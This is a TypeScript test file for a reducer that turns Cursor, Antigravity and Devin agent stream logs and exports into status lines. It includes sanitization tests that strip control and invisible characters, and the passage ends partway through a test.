import { expect, test } from 'claude-code/testing'

import {
  applyDevinExport,
  DEVIN_EXPORT_MAX_BYTES,
  devinExitCode,
  EXPORT_TOO_LARGE,
  resolveDevinRun,
} from '../hooks/adapters/devin'
import {
  appendMessage,
  cleanErrTail,
  BRIEF_MAX_BYTES,
  briefKeyAfterRead,
  cappedText,
  isReadableSideFile,
  changedFileKey,
  classifyAgyTool,
  completeLines,
  doingLabel,
  durationMsOf,
  emptyRun,
  endTimeOf,
  EXIT_MAX_BYTES,
  finishMessage,
  isCopyableId,
  isAnimating,
  isDevinSettled,
  isSwitchedRun,
  MSG_RAW_MAX,
  oneLine,
  paneTitle,
  parseBrief,
  withSpark,
  phaseOf,
  pickNewestRunFile,
  reduceLine,
  resumeCommand,
  runElapsed,
  sanitize,
  shouldAnnounce,
  STALL_MS,
  statusLine,
  utf8Bytes,
} from '../hooks/reduce'
import { generate, generateLines } from '../scripts/generate.ts'
import type { Backend } from '../types'

// Shape of `agent -p --output-format stream-json`, trimmed.
const STREAM = [
  { type: 'system', subtype: 'init', session_id: 'sess-123', model: 'gpt-5', cwd: '/repo' },
  { type: 'user', message: { role: 'user', content: [{ type: 'text', text: 'Read the brief' }] } },
  {
    type: 'assistant',
    message: { role: 'assistant', content: [{ type: 'text', text: 'Reading the brief and plan now.' }] },
  },
  {
    type: 'tool_call',
    subtype: 'started',
    call_id: 'c1',
    tool_call: { readToolCall: { args: { path: '/repo/docs/plans/x.md' } } },
  },
  {
    type: 'tool_call',
    subtype: 'completed',
    call_id: 'c1',
    tool_call: { readToolCall: { args: { path: '/repo/docs/plans/x.md' }, result: {} } },
  },
  {
    type: 'tool_call',
    subtype: 'started',
    call_id: 'c2',
    tool_call: { editToolCall: { args: { path: '/repo/src/app.ts' } } },
  },
  {
    type: 'tool_call',
    subtype: 'completed',
    call_id: 'c2',
    tool_call: { editToolCall: { args: { path: '/repo/src/app.ts' }, result: {} } },
  },
  {
    type: 'tool_call',
    subtype: 'started',
    call_id: 'c3',
    tool_call: { shellToolCall: { args: { command: 'yarn test' } } },
  },
].map(line => JSON.stringify(line))

const RESULT = JSON.stringify({
  type: 'result',
  subtype: 'success',
  is_error: false,
  duration_ms: 125000,
  result: 'All steps done.',
})

const fold = (lines: string[], backend: Backend = 'cursor', n = 1) =>
  lines.reduce(reduceLine, { ...emptyRun(n, backend), startedAt: 0, lastGrowthAt: 0 })

test('a running stream shows the current tool and edited files', async () => {
  const run = fold(STREAM)

  expect(run.backend).toBe('cursor')
  expect(run.sessionId).toBe('sess-123')
  expect(run.tool).toBe('shell')
  expect(run.toolDetail).toBe('yarn test')
  expect(run.tools).toBe(3)
  expect(run.files).toEqual(['app.ts'])
  expect(run.snippet).toBe('Reading the brief and plan now.')
  expect(phaseOf(run, 1000)).toBe('running')
  expect(statusLine(run, 61_000)).toBe('exec #1 [cursor] ▸ shell yarn test · 3 tools · 1m01s')
})

test('pass needs exit 0 and a success result', async () => {
  const run = fold([...STREAM, RESULT])

  expect(phaseOf(run, 0)).toBe('passed')
  expect(phaseOf({ ...run, exitCode: 0 }, 0)).toBe('passed')
  expect(phaseOf({ ...run, exitCode: 1 }, 0)).toBe('failed')
  expect(phaseOf({ ...fold(STREAM), exitCode: 0 }, 0)).toBe('failed')
  expect(statusLine({ ...run, exitCode: 0 }, 0)).toBe(
    'exec #1 [cursor] ✓ done · 3 tools · 1 files · 2m05s',
  )
})

test('a quiet stream with no exit reads as stalled', async () => {
  expect(phaseOf(fold(STREAM), 91_000)).toBe('stalled')
})

test('garbage and unknown events are counted, not fatal', async () => {
  const run = fold(['{not json', JSON.stringify({ type: 'thinking', delta: 'x' }), ...STREAM])

  expect(run.badLines).toBe(1)
  expect(run.tools).toBe(3)
})

test('a partial trailing line waits for the next read', async () => {
  const { lines, bytes } = completeLines('{"a":1}\n{"b":2}\n{"c":')

  expect(lines).toEqual(['{"a":1}', '{"b":2}'])
  expect(bytes).toBe(16)
  expect(utf8Bytes('é…😀\n')).toBe(2 + 3 + 4 + 1)
})

test('consecutive reads fold into N× read', async () => {
  const lines = Array.from({ length: 12 }, (_, i) => [
    JSON.stringify({
      type: 'tool_call',
      subtype: 'started',
      call_id: `r${i}`,
      tool_call: { readToolCall: { args: { path: `/repo/f${i}.ts` } } },
    }),
    JSON.stringify({
      type: 'tool_call',
      subtype: 'completed',
      call_id: `r${i}`,
      tool_call: { readToolCall: { args: { path: `/repo/f${i}.ts` }, result: {} } },
    }),
  ]).flat()

  const run = fold(lines)
  const reads = run.timeline.filter(e => e.kind === 'read')
  expect(reads).toHaveLength(1)
  expect(reads[0]?.count).toBe(12)
  expect(run.counts.read).toBe(12)
})

test('assistant chunks merge into one msg entry', async () => {
  const lines = ['one', 'two', 'three'].map(text =>
    JSON.stringify({
      type: 'assistant',
      message: { role: 'assistant', content: [{ type: 'text', text }] },
    }),
  )
  const run = fold(lines)
  const msgs = run.timeline.filter(e => e.kind === 'msg')
  expect(msgs).toHaveLength(1)
  expect(msgs[0]?.label).toContain('one')
  expect(msgs[0]?.label).toContain('three')
})

test('timeline stays at 200 and droppedEntries counts the rest', async () => {
  const lines = Array.from({ length: 250 }, (_, i) =>
    JSON.stringify({
      type: 'tool_call',
      subtype: 'started',
      call_id: `e${i}`,
      tool_call: { editToolCall: { args: { path: `/repo/file-${i}.ts` } } },
    }),
  )
  const run = fold(lines)
  expect(run.timeline.length).toBe(200)
  expect(run.droppedEntries).toBe(50)
  expect(run.tools).toBe(250)
})

test('a failed tool increments failedTools and marks the entry', async () => {
  const lines = [
    JSON.stringify({
      type: 'tool_call',
      subtype: 'started',
      call_id: 's1',
      tool_call: { shellToolCall: { args: { command: 'false' } } },
    }),
    JSON.stringify({
      type: 'tool_call',
      subtype: 'completed',
      call_id: 's1',
      tool_call: {
        shellToolCall: { args: { command: 'false' }, result: { is_error: true, error: 'exit 1' } },
      },
    }),
  ]
  const run = fold(lines)
  expect(run.failedTools).toBe(1)
  expect(run.timeline.some(e => e.isOk === false)).toBe(true)
})

test('a 5k-event stream stays bounded and serializes small', async () => {
  const lines = generate({ events: 5000, seed: 1 })
  const run = fold(lines)

  expect(run.timeline.length).toBeLessThanOrEqual(200)
  const toolKinds =
    run.counts.read +
    run.counts.search +
    run.counts.edit +
    run.counts.shell +
    run.counts.task +
    run.counts.tool
  expect(toolKinds).toBe(run.tools)
  expect(phaseOf({ ...run, exitCode: 0 }, 0)).toBe('passed')
  const size = JSON.stringify(run).length
  expect(size).toBeLessThan(64 * 1024)
})

test('agy init sets sessionId and model from top-level or nested init object', async () => {
  const topLevel = fold(
    [
      JSON.stringify({
        event: 'init',
        conversation_id: 'conv-abc',
        model: 'gemini-2.5-pro',
        init: { cwd: '/repo', permission_mode: 'dangerously_skip_permissions' },
      }),
    ],
    'agy',
  )
  expect(topLevel.backend).toBe('agy')
  expect(topLevel.sessionId).toBe('conv-abc')
  expect(topLevel.model).toBe('gemini-2.5-pro')

  const nested = fold(
    [
      JSON.stringify({
        event: 'init',
        init: { conversation_id: 'conv-nested', model: 'gemini-2.5-flash', cwd: '/repo' },
      }),
    ],
    'agy',
  )
  expect(nested.sessionId).toBe('conv-nested')
  expect(nested.model).toBe('gemini-2.5-flash')
})

const nestedAgyStep = (
  fields: Record<string, unknown>,
  state: 'ACTIVE' | 'DONE' = 'DONE',
  stepIndex = 0,
) =>
  JSON.stringify({
    event: 'step_update',
    step_update: {
      conversation_id: 'conv-nested',
      step_index: stepIndex,
      state,
      ...fields,
    },
  })

test('agy step_update classifies tools across all categories and tracks edited files', async () => {
  expect(classifyAgyTool('read_file')).toBe('read')
  expect(classifyAgyTool('view_file_outline')).toBe('read')
  expect(classifyAgyTool('grep_search')).toBe('search')
  expect(classifyAgyTool('code_search')).toBe('search')
  expect(classifyAgyTool('find_by_name')).toBe('search')
  expect(classifyAgyTool('glob_files')).toBe('search')
  expect(classifyAgyTool('write_to_file')).toBe('edit')
  expect(classifyAgyTool('edit_file')).toBe('edit')
  expect(classifyAgyTool('replace_file_content')).toBe('edit')
  expect(classifyAgyTool('create_file')).toBe('edit')
  expect(classifyAgyTool('run_command')).toBe('shell')
  expect(classifyAgyTool('shell_exec')).toBe('shell')
  expect(classifyAgyTool('browser_subagent')).toBe('task')
  expect(classifyAgyTool('mcp_custom_action')).toBe('tool')

  // Flat fixture shape (compat): fields on the top-level event.
  const steps = [
    { name: 'read_file', parameters: { path: '/repo/README.md' } },
    { name: 'view_file', parameters: { AbsolutePath: '/repo/docs/plan.md' } },
    { name: 'grep_search', parameters: { query: 'reduceAgyEvent' } },
    { name: 'find_by_name', parameters: { pattern: '*.ts' } },
    { name: 'glob_files', parameters: { DirectoryPath: '/repo/src' } },
    { name: 'write_to_file', parameters: { TargetFile: '/repo/src/a.ts' } },
    { name: 'replace_file_content', parameters: { target_file: '/repo/src/b.ts' } },
    { name: 'run_command', parameters: { CommandLine: 'nix flake check' } },
    { name: 'browser_subagent', parameters: { description: 'inspect docs' } },
    { name: 'mcp_custom_action', parameters: { description: 'custom call' } },
  ].map(tool_info =>
    JSON.stringify({
      event: 'step_update',
      step_type: 'tool',
      tool_info,
    }),
  )

  const run = fold(steps, 'agy')
  expect(run.tools).toBe(10)
  expect(run.counts.read).toBe(2)
  expect(run.counts.search).toBe(3)
  expect(run.counts.edit).toBe(2)
  expect(run.counts.shell).toBe(1)
  expect(run.counts.task).toBe(1)
  expect(run.counts.tool).toBe(1)
  expect(run.files).toEqual(['b.ts', 'a.ts'])
})

test('agy nested step_update tool DONE classifies tools and tracks edited files', async () => {
  const steps = [
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'read_file',
        tool_info: { name: 'read_file', parameters: { path: '/repo/README.md' } },
      },
      'DONE',
      1,
    ),
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'write_to_file',
        tool_info: { name: 'write_to_file', parameters: { TargetFile: '/repo/src/a.ts' } },
      },
      'DONE',
      2,
    ),
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'replace_file_content',
        tool_info: {
          name: 'replace_file_content',
          parameters: { target_file: '/repo/src/b.ts' },
        },
      },
      'DONE',
      3,
    ),
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'run_command',
        tool_info: { name: 'run_command', parameters: { CommandLine: 'nix flake check' } },
      },
      'DONE',
      4,
    ),
  ]
  const run = fold(steps, 'agy')
  expect(run.tools).toBe(4)
  expect(run.counts.read).toBe(1)
  expect(run.counts.edit).toBe(2)
  expect(run.counts.shell).toBe(1)
  expect(run.files).toEqual(['b.ts', 'a.ts'])
})

test('agy nested ACTIVE then DONE does not double-count a tool', async () => {
  const lines = [
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'run_command',
        tool_info: { name: 'run_command', parameters: { CommandLine: 'echo hi' } },
      },
      'ACTIVE',
      4,
    ),
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'run_command',
        tool_info: {
          name: 'run_command',
          parameters: { CommandLine: 'echo hi' },
          output: 'hi\n',
        },
      },
      'DONE',
      4,
    ),
  ]
  const run = fold(lines, 'agy')
  expect(run.tools).toBe(1)
  expect(run.counts.shell).toBe(1)
  expect(run.timeline).toHaveLength(1)
  expect(run.tool).toBe('run_command')
  expect(run.toolDetail).toBe('echo hi')
})

test('agy nested agent_response text_delta chunks merge into a single msg entry', async () => {
  const lines = [
    nestedAgyStep(
      { step_type: 'agent_response', text_delta: 'Inspecting ' },
      'ACTIVE',
      2,
    ),
    nestedAgyStep(
      { step_type: 'agent_response', text_delta: 'the repository ' },
      'ACTIVE',
      2,
    ),
    nestedAgyStep(
      { step_type: 'agent_response', text_delta: 'layout now.' },
      'DONE',
      2,
    ),
  ]
  const run = fold(lines, 'agy')
  expect(run.counts.msg).toBe(1)
  const msgs = run.timeline.filter(e => e.kind === 'msg')
  expect(msgs).toHaveLength(1)
  expect(msgs[0]?.label).toContain('Inspecting')
  expect(msgs[0]?.label).toContain('layout now.')
  expect(run.snippet).toBe('layout now.')
})

test('agy nested subagent_info maps to task', async () => {
  const lines = [
    nestedAgyStep(
      {
        step_type: 'tool',
        tool_name: 'browser_subagent',
        subagent_info: {
          subagents: [{ type_name: 'browser_subagent', role: 'inspect docs' }],
        },
      },
      'DONE',
      7,
    ),
  ]
  const run = fold(lines, 'agy')
  expect(run.tools).toBe(1)
  expect(run.counts.task).toBe(1)
  expect(run.timeline[0]?.kind).toBe('task')
  expect(run.tool).toBe('browser_subagent')
})

test('agy failed tool sets isOk false and increments failedTools and counts.error', async () => {
  // Flat string error (compat).
  const flat = fold(
    [
      JSON.stringify({
        event: 'step_update',
        step_type: 'tool',
        tool_info: {
          name: 'run_command',
          parameters: { command: 'false' },
          output: '',
          error: 'Command exited with status 1',
        },
      }),
    ],
    'agy',
  )
  expect(flat.failedTools).toBe(1)
  expect(flat.counts.shell).toBe(1)
  expect(flat.counts.error).toBe(1)
  expect(flat.timeline).toHaveLength(1)
  expect(flat.timeline[0]?.isOk).toBe(false)

  // Nested error object `{ type, message }` (live stream).
  const nested = fold(
    [
      nestedAgyStep(
        {
          step_type: 'tool',
          tool_name: 'run_command',
          tool_info: {
            name: 'run_command',
            parameters: { CommandLine: 'false' },
            output: '',
            error: { type: 'command_failed', message: 'Command exited with status 1' },
          },
        },
        'DONE',
        5,
      ),
    ],
    'agy',
  )
  expect(nested.failedTools).toBe(1)
  expect(nested.counts.shell).toBe(1)
  expect(nested.counts.error).toBe(1)
  expect(nested.timeline[0]?.isOk).toBe(false)
})

test('agy agent_response text_delta chunks merge into a single msg entry', async () => {
  // Flat fixture shape (compat).
  const lines = ['Inspecting ', 'the repository ', 'layout now.'].map(text_delta =>
    JSON.stringify({
      event: 'step_update',
      step_type: 'agent_response',
      text_delta,
    }),
  )
  const run = fold(lines, 'agy')
  expect(run.counts.msg).toBe(1)
  const msgs = run.timeline.filter(e => e.kind === 'msg')
  expect(msgs).toHaveLength(1)
  expect(msgs[0]?.label).toContain('Inspecting')
  expect(msgs[0]?.label).toContain('layout now.')
  expect(run.snippet).toBe('layout now.')
})

test('agy result handles SUCCESS, ERROR, and print_timeout', async () => {
  const okRun = fold(
    [
      JSON.stringify({
        event: 'result',
        status: 'SUCCESS',
        finished_reason: 'stop',
        duration_seconds: 42.4,
      }),
    ],
    'agy',
    3,
  )
  expect(okRun.result).toEqual({ isOk: true, subtype: 'success', durationMs: 42_400 })
  expect(phaseOf({ ...okRun, exitCode: 0 }, 0)).toBe('passed')
  expect(statusLine({ ...okRun, exitCode: 0 }, 0)).toBe(
    'exec #3 [agy] ✓ done · 0 tools · 0 files · 42s',
  )

  const errRun = fold(
    [
      JSON.stringify({
        event: 'result',
        status: 'ERROR',
        finished_reason: 'api_error',
        duration_seconds: 12,
      }),
    ],
    'agy',
    4,
  )
  expect(errRun.result?.isOk).toBe(false)
  expect(errRun.result?.subtype).toBe('ERROR')
  expect(phaseOf({ ...errRun, exitCode: 0 }, 0)).toBe('failed')
  expect(statusLine({ ...errRun, exitCode: 0 }, 0)).toBe('exec #4 [agy] ✗ ERROR · 12s')

  const timeoutRun = fold(
    [
      JSON.stringify({
        event: 'result',
        result: {
          status: 'SUCCESS',
          finished_reason: 'print_timeout',
          duration_seconds: 300,
        },
      }),
    ],
    'agy',
    5,
  )
  expect(timeoutRun.result?.isOk).toBe(false)
  expect(timeoutRun.result?.subtype).toBe('print_timeout')
  expect(phaseOf({ ...timeoutRun, exitCode: 0 }, 0)).toBe('failed')
  expect(statusLine({ ...timeoutRun, exitCode: 0 }, 0)).toBe('exec #5 [agy] ✗ print_timeout · 5m00s')
})

test('agy unknown events and malformed lines are ignored cleanly', async () => {
  const lines = [
    '{bad json',
    'not-json-at-all',
    JSON.stringify({ event: 'unknown_future_event', foo: 'bar' }),
    JSON.stringify({ event: 'step_update', step_type: 'checkpoint', id: 'cp-1' }),
    JSON.stringify({ event: 'step_update', step_type: 'user_input', text: 'hello' }),
    JSON.stringify({ event: 'step_update', step_type: 'agent_response', text_delta: '   ' }),
    JSON.stringify({
      event: 'init',
      conversation_id: 'conv-clean',
      model: 'gemini-2.5-pro',
    }),
  ]
  const run = fold(lines, 'agy')
  expect(run.lines).toBe(7)
  expect(run.badLines).toBe(2)
  expect(run.sessionId).toBe('conv-clean')
  expect(run.timeline).toHaveLength(0)
})

test('generated agy stream reduces end-to-end across outcomes', async () => {
  const lines = generateLines({ backend: 'agy', events: 5000, seed: 1 })
  const run = fold(lines, 'agy')

  expect(run.backend).toBe('agy')
  expect(run.sessionId).toBe('conv-fake-1')
  expect(run.model).toBe('gemini-2.5-pro')
  expect(run.badLines).toBe(2)
  expect(run.timeline.length).toBeLessThanOrEqual(200)
  const toolKinds =
    run.counts.read +
    run.counts.search +
    run.counts.edit +
    run.counts.shell +
    run.counts.task +
    run.counts.tool
  expect(toolKinds).toBe(run.tools)
  expect(run.counts.read).toBeGreaterThan(0)
  expect(run.counts.search).toBeGreaterThan(0)
  expect(run.counts.edit).toBeGreaterThan(0)
  expect(run.counts.shell).toBeGreaterThan(0)
  expect(run.counts.task).toBeGreaterThan(0)
  expect(run.counts.error).toBeGreaterThan(0)
  expect(run.failedTools).toBeGreaterThanOrEqual(1)
  expect(run.files.length).toBe(6)
  expect(phaseOf({ ...run, exitCode: 0 }, 0)).toBe('passed')
  expect(JSON.stringify(run).length).toBeLessThan(64 * 1024)

  const failed = fold(generateLines({ backend: 'agy', events: 40, seed: 2, outcome: 'fail' }), 'agy')
  expect(failed.result?.isOk).toBe(false)
  expect(phaseOf({ ...failed, exitCode: 0 }, 0)).toBe('failed')

  const timedOut = fold(
    generateLines({ backend: 'agy', events: 40, seed: 3, outcome: 'print_timeout' }),
    'agy',
  )
  expect(timedOut.result?.isOk).toBe(false)
  expect(timedOut.result?.subtype).toBe('print_timeout')
  expect(phaseOf({ ...timedOut, exitCode: 0 }, 0)).toBe('failed')
})

test('pickNewestRunFile prefers newer mtime, tiebreaks by higher n, and ignores legacy/non-matching files', async () => {
  const legacyRunName = `${'evc'}-run-1.ndjson`
  const picked = pickNewestRunFile([
    { name: legacyRunName, mtimeMs: 9_999_999, size: 500 },
    { name: 'exec-run-cursor-5.ndjson', mtimeMs: 1_000, size: 1200 },
    { name: 'exec-run-agy-1.ndjson', mtimeMs: 2_000, size: 800 },
    { name: 'exec-run-agy-1.err', mtimeMs: 5_000, size: 50 },
    { name: 'exec-agy-brief.md', mtimeMs: 6_000, size: 300 },
  ])
  expect(picked?.name).toBe('exec-run-agy-1.ndjson')
  expect(picked?.backend).toBe('agy')
  expect(picked?.n).toBe(1)

  const tieBroken = pickNewestRunFile([
    { name: 'exec-run-cursor-2.ndjson', mtimeMs: 3_000, size: 100 },
    { name: 'exec-run-agy-7.ndjson', mtimeMs: 3_000, size: 100 },
    { name: 'exec-run-cursor-4.ndjson', mtimeMs: 3_000, size: 100 },
  ])
  expect(tieBroken?.name).toBe('exec-run-agy-7.ndjson')
  expect(tieBroken?.backend).toBe('agy')
  expect(tieBroken?.n).toBe(7)

  expect(
    pickNewestRunFile([
      { name: legacyRunName, mtimeMs: 1_000 },
      { name: 'exec-run-unknown-1.ndjson', mtimeMs: 2_000 },
      { name: 'notes.txt', mtimeMs: 3_000 },
    ]),
  ).toBeNull()

  expect(paneTitle('cursor')).toBe('Cursor run')
  expect(paneTitle('agy')).toBe('Antigravity run')
  expect(paneTitle('devin')).toBe('Devin run')
})

const DEVIN_EXPORT = {
  schema_version: 'ATIF-v1.7',
  session_id: 'sess-devin-1',
  agent: { name: 'devin', model_name: 'ignored-when-steps-have-a-model' },
  steps: [
    { source: 'user', message: 'do the step' },
    {
      source: 'agent',
      model_name: 'gpt-6-1-terra-high',
      message: 'Editing app.ts now.',
      tool_calls: [
        { tool_call_id: 'a', function_name: 'read_file', arguments: { path: '/repo/src/app.ts' } },
        { tool_call_id: 'b', function_name: 'grep', arguments: { pattern: 'TODO' } },
        { tool_call_id: 'c', function_name: 'edit_file', arguments: { path: '/repo/src/app.ts' } },
        {
          tool_call_id: 'd',
          function_name: 'edit_file',
          arguments: '{"path":"/repo/src/lib.ts"}',
        },
        { tool_call_id: 'e', function_name: 'shell', arguments: { command: 'yarn test' } },
        { tool_call_id: 'f', function_name: 'task', arguments: { description: 'review' } },
        { tool_call_id: 'g', function_name: 'shell', arguments: { command: 'false' } },
      ],
      observation: {
        results: [{ source_call_id: 'g', content: 'failed', error: 'exit 1' }],
      },
    },
  ],
  final_metrics: { total_prompt_tokens: 20, total_completion_tokens: 8 },
}

test('a devin export folds session, model, tool kinds, and edited files', async () => {
  const text = JSON.stringify(DEVIN_EXPORT, null, 2)
  const run = applyDevinExport(emptyRun(1, 'devin'), text, 0)

  expect(run.backend).toBe('devin')
  expect(run.sessionId).toBe('sess-devin-1')
  expect(run.model).toBe('gpt-6-1-terra-high')
  expect(run.tools).toBe(7)
  expect(run.counts.read).toBe(1)
  expect(run.counts.search).toBe(1)
  expect(run.counts.edit).toBe(2)
  expect(run.counts.shell).toBe(2)
  expect(run.counts.task).toBe(1)
  expect(run.failedTools).toBe(1)
  expect(run.counts.error).toBe(1)
  expect(run.files).toEqual(['lib.ts', 'app.ts'])
  expect(run.snippet).toBe('Editing app.ts now.')
  expect(run.result).toEqual({ isOk: true, subtype: 'success', durationMs: null })
  expect(phaseOf(run, 0)).toBe('passed')
  expect(statusLine(run, 0)).toBe('exec #1 [devin] ✓ done · 7 tools · 2 files')

  const mismatched = applyDevinExport(emptyRun(1, 'devin'), text, 1)
  expect(mismatched.result?.isOk).toBe(false)
  expect(phaseOf(mismatched, 0)).toBe('failed')

  const stopped = {
    ...DEVIN_EXPORT,
    steps: [...DEVIN_EXPORT.steps, { source: 'user', message: 'wait' }],
  }
  const userLast = applyDevinExport(emptyRun(1, 'devin'), JSON.stringify(stopped), 0)
  expect(userLast.result?.isOk).toBe(false)
  expect(userLast.result?.subtype).toBe('user')

  const fromAgent = applyDevinExport(
    emptyRun(1, 'devin'),
    JSON.stringify({
      session_id: 'sess-agent-only',
      agent: { model_name: 'swe-2-high' },
      steps: [{ source: 'agent', message: 'no step model' }],
    }),
    0,
  )
  expect(fromAgent.model).toBe('swe-2-high')

  const joined = applyDevinExport(
    emptyRun(1, 'devin'),
    JSON.stringify({
      session_id: 'sess-two',
      steps: [
        { source: 'agent', model_name: 'gpt-6-1-terra-low', message: 'first' },
        { source: 'agent', model_name: 'gpt-6-1-terra-high', message: 'second' },
      ],
    }),
    0,
  )
  expect(joined.model).toBe('gpt-6-1-terra-low, gpt-6-1-terra-high')
})

test('a devin run with no export yet stays running and lines are not a stream', async () => {
  const waiting = { ...emptyRun(2, 'devin'), startedAt: 0, lastGrowthAt: 1_000 }
  expect(waiting.result).toBeNull()
  expect(waiting.exitCode).toBeNull()
  expect(phaseOf(waiting, 2_000)).toBe('running')

  const lined = reduceLine(waiting, '{"session_id":"x"}')
  expect(lined.result).toBeNull()
  expect(lined.backend).toBe('devin')
  expect(lined.lines).toBe(1)
})

test('a missing or unparseable devin export is a failed result', async () => {
  const base = emptyRun(1, 'devin')
  const missing = applyDevinExport(base, null, 0)
  expect(missing.result).toEqual({ isOk: false, subtype: 'missing export', durationMs: null })
  expect(missing.exitCode).toBe(0)
  expect(phaseOf(missing, 0)).toBe('failed')
  expect(statusLine(missing, 0)).toBe('exec #1 [devin] ✗ missing export')

  const bad = applyDevinExport(base, '{not json', 0)
  expect(bad.result?.subtype).toBe('unparseable')
  expect(bad.result?.isOk).toBe(false)
  expect(phaseOf(bad, 0)).toBe('failed')
  expect(applyDevinExport(base, 'null', 0).result?.subtype).toBe('unparseable')
  expect(() => applyDevinExport(base, '', null)).not.toThrow()
})

test('pickNewestRunFile picks a devin .out among mixed backends and ignores the export', async () => {
  const picked = pickNewestRunFile([
    { name: 'exec-run-devin-1.json', mtimeMs: 9_000, size: 400 },
    { name: 'exec-run-devin-1.err', mtimeMs: 9_000, size: 20 },
    { name: 'exec-run-devin-1.exit', mtimeMs: 9_000, size: 2 },
    { name: 'exec-run-cursor-1.out', mtimeMs: 8_000, size: 100 },
    { name: 'exec-run-devin-3.ndjson', mtimeMs: 8_000, size: 100 },
    { name: 'exec-run-agy-2.ndjson', mtimeMs: 1_000, size: 80 },
    { name: 'exec-run-cursor-4.ndjson', mtimeMs: 1_500, size: 90 },
    { name: 'exec-run-devin-3.out', mtimeMs: 2_000, size: 10 },
  ])
  expect(picked?.name).toBe('exec-run-devin-3.out')
  expect(picked?.backend).toBe('devin')
  expect(picked?.n).toBe(3)
})

test('a generated devin document folds to a summary when the run ends', async () => {
  const lines = generateLines({ backend: 'devin', events: 12, seed: 1 })
  const text = lines.join('\n')
  const doc = JSON.parse(text) as { schema_version: string }
  expect(doc.schema_version).toBe('ATIF-v1.7')

  const run = applyDevinExport(emptyRun(4, 'devin'), text, 0)
  expect(run.sessionId).toBe('sess-fake-1')
  expect(run.model).toBe('gpt-6-1-terra-high')
  expect(run.tools).toBeGreaterThan(0)
  expect(run.files.length).toBeGreaterThan(0)
  expect(run.counts.read).toBeGreaterThan(0)
  expect(run.counts.search).toBeGreaterThan(0)
  expect(run.counts.edit).toBeGreaterThan(0)
  expect(run.counts.shell).toBeGreaterThan(0)
  expect(run.counts.task).toBeGreaterThan(0)
  expect(run.failedTools).toBeGreaterThan(0)
  expect(run.result?.isOk).toBe(true)
  expect(phaseOf(run, 0)).toBe('passed')
  const toolKinds =
    run.counts.read +
    run.counts.search +
    run.counts.edit +
    run.counts.shell +
    run.counts.task +
    run.counts.tool
  expect(toolKinds).toBe(run.tools)

  const failedText = generateLines({ backend: 'devin', events: 12, seed: 2, outcome: 'fail' }).join('\n')
  const failed = applyDevinExport(emptyRun(4, 'devin'), failedText, 0)
  expect(failed.result?.isOk).toBe(false)
  expect(phaseOf(failed, 0)).toBe('failed')
})

// Devin run decisions: pure functions that register.tsx feeds from the files.
const GOOD_EXPORT = JSON.stringify(DEVIN_EXPORT)
const decide = (exitText: string | null, exportText: string | null, exportSize?: number) =>
  resolveDevinRun(
    { ...emptyRun(1, 'devin'), startedAt: 0, lastGrowthAt: 0 },
    {
      exitText,
      exportText,
      exportSize: exportText === null ? null : (exportSize ?? utf8Bytes(exportText)),
    },
    5_000,
  )

test('devin exit text: absent, empty or non-numeric is not yet exited', async () => {
  expect(devinExitCode(null)).toBeNull()
  expect(devinExitCode('')).toBeNull()
  expect(devinExitCode(' \n')).toBeNull()
  expect(devinExitCode('abc')).toBeNull()
  expect(devinExitCode('0')).toBe(0)
  expect(devinExitCode('1\n')).toBe(1)
})

test('a devin run is running until .exit holds a number, then passed or failed', async () => {
  const absent = decide(null, GOOD_EXPORT)
  expect(absent.result).toBeNull()
  expect(absent.exitCode).toBeNull()
  expect(absent.lastGrowthAt).toBe(5_000)
  expect(phaseOf(absent, 5_000)).toBe('running')

  const empty = decide('', GOOD_EXPORT)
  expect(empty.result).toBeNull()
  expect(phaseOf(empty, 5_000)).toBe('running')

  const passed = decide('0\n', GOOD_EXPORT)
  expect(phaseOf(passed, 5_000)).toBe('passed')
  expect(passed.result?.subtype).toBe('success')

  const failed = decide('1', GOOD_EXPORT)
  expect(phaseOf(failed, 5_000)).toBe('failed')
  expect(statusLine(failed, 5_000)).toContain('exit 1')

  const unparseable = decide('0', '{not json')
  expect(phaseOf(unparseable, 5_000)).toBe('failed')
  expect(unparseable.result?.subtype).toBe('unparseable')

  const missing = decide('0', null)
  expect(missing.result?.subtype).toBe('missing export')
  expect(phaseOf(missing, 5_000)).toBe('failed')
})

test('an oversize devin export is decided by the exit code alone', async () => {
  const size = DEVIN_EXPORT_MAX_BYTES + 1
  const ok = decide('0', '{', size)
  expect(ok.result).toEqual({ isOk: true, subtype: EXPORT_TOO_LARGE, durationMs: null })
  expect(phaseOf(ok, 5_000)).toBe('passed')
  expect(ok.timeline[ok.timeline.length - 1]?.label).toBe(EXPORT_TOO_LARGE)

  const atCap = decide('0', GOOD_EXPORT, DEVIN_EXPORT_MAX_BYTES)
  expect(atCap.result?.subtype).toBe('success')

  const bad = decide('2', '{', size)
  expect(bad.result?.isOk).toBe(false)
  expect(phaseOf(bad, 5_000)).toBe('failed')
  expect(statusLine(bad, 5_000)).toContain('exit 2')
})

test('a latched devin result is kept on later ticks', async () => {
  const first = decide('0', GOOD_EXPORT)
  const again = resolveDevinRun(first, { exitText: '0', exportSize: null, exportText: null }, 9_000)
  expect(again.result).toEqual(first.result)
  expect(again.timeline).toEqual(first.timeline)
})

test('a devin step source outside the allowlist maps to failed', async () => {
  const last = (source: string) =>
    applyDevinExport(
      emptyRun(1, 'devin'),
      JSON.stringify({ steps: [{ source: 'agent', message: 'x' }, { source }] }),
      0,
    )
  expect(last('system').result?.subtype).toBe('system')
  expect(last('user').result?.subtype).toBe('user')
  const evil = last('\u001b[31mowned\nlong'.repeat(500))
  expect(evil.result?.subtype).toBe('failed')
  expect(statusLine(evil, 0)).toBe('exec #1 [devin] ✗ failed')
  expect(last('').result?.subtype).toBe('failed')
})

test('sanitize strips control characters and caps length; oneLine uses it', async () => {
  expect(sanitize('a\u0000b\u001b[2Jc\u007f\u009dd', 64)).toBe('ab[2Jcd')
  expect(sanitize('x'.repeat(10_000), 64)).toHaveLength(64)
  expect(sanitize('x'.repeat(10_000), 64).endsWith('…')).toBe(true)
  expect(oneLine('a\u001bb\n  c')).toBe('ab c')
})

test('sanitize also strips invisible format characters', async () => {
  expect(sanitize('a\u202eb\u200bc\u00add\u061ce\ufe0ff\u{e0001}g', 64)).toBe('abcdefg')
  expect(oneLine('x\t y')).toBe('x y')
  expect(oneLine('p\u2060q')).toBe('pq')
})

test('streamed deltas join as sent and the final message replaces them', async () => {
